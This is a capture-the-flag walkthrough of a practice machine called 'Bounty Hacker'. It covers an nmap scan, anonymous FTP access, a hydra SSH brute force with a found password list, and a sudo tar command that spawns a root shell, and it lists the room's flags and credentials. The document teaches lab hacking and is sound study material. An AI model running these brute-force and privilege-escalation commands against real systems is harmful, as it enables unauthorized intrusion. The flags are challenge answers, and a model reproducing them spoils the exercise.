**Tristan Gomez**

```
You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims!
Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

```

We'll start with a classic nmap scan. It seems like 3 ports are open. Let's try to connect using ftp and see if anonymous ftp is allowed.
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ sudo nmap -sS 10.10.115.79
[sudo] password for gomez22: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 12:04 PDT
Nmap scan report for 10.10.115.79
Host is up (0.16s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```


Oh wow, we just needed the name `anonymous` and didn't even need a password. Looks like we have 2 files in this ftp directory. Let's take a look at them.
```
ftp> open 10.10.9.85
Connected to 10.10.9.85.
220 (vsFTPd 3.0.3)
Name (10.10.9.85:gomez22): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

In `task.txt`
```
└─$ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
We have 2 potential login names, `lin` and `Vicious`.

In locks.txt, we have...
```
└─$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
Hmm, this looks like a password list. I am going to try to try to brute force the ssh login using this list in hydra. `$ hydra -l lin -P locks.txt ssh://10.10.115.79`  

```
[22][ssh] host: 10.10.115.79   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-14 12:47:27
```
We have a password! -> `RedDr4gonSynd1cat3`


Let's login and get the user flag!
```
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```


Now, we need to privesc to get the root flag. Let's check the permissions for lin
```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
Huh, we can run tar as root with lin. Let's consult `gtfobins` to see how to abuse this.

Running the below command gives us root.
```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

Bam, ez!

